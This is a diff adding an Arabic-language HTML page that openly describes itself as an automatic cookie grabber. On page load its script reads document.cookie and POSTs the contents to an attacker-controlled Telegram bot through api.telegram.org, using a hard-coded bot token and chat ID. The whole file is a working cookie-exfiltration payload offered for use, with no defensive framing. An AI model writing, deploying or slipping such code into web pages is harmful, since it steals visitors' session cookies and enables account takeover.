@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سحب تلقائي للكوكيز</title>
+</head>
+<body>
+    <!-- الهيكل الفارغ، الكود هيتنفذ فوراً -->
+    <h1>جاري سحب وإرسال الكوكيز إلى التليجرام...</h1>
+    <p>افتح الـ Console (F12) عشان تشوف النتيجة.</p>
+
+    <script>
+        // ===========================================
+        //     استبدل البيانات دي بتاعتك
+        // ===========================================
+        const BOT_TOKEN = "8890411882:AAGH1fcFjTn_psy_N8cdvdPrgKY2t3GRp1A"; // التوكن اللي في الصورة
+        const CHAT_ID = "5722006162";                   // الـ ID اللي في الصورة
+        
+        // ===========================================
+
+        // دالة لجلب كل الكوكيز
+        function getCookies() {
+            return document.cookie;
+        }
+
+        // دالة لإرسال رسالة للتليجرام
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: CHAT_ID,
+                text: message
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(res => res.json())
+            .then(res => {
+                if (res.ok) {
+                    console.log("✅ تم الإرسال بنجاح!");
+                } else {
+                    console.error("❌ فشل الإرسال:", res.description);
+                }
+            })
+            .catch(err => console.error("🚨 خطأ في الشبكة:", err));
+        }
+
+        // ===========================================
+        //     التشغيل التلقائي عند فتح الصفحة
+        // ===========================================
+        window.onload = function() {
+            const cookies = getCookies();
+            if (cookies && cookies.length > 0) {
+                sendToTelegram(`🍪 الكوكيز المسحوبة:\n\n${cookies}`);
+            } else {
+                sendToTelegram("⚠️ لا توجد كوكيز (أو ممنوع الوصول لها).");
+            }
+        };
+    </script>
+</body>
+</html>
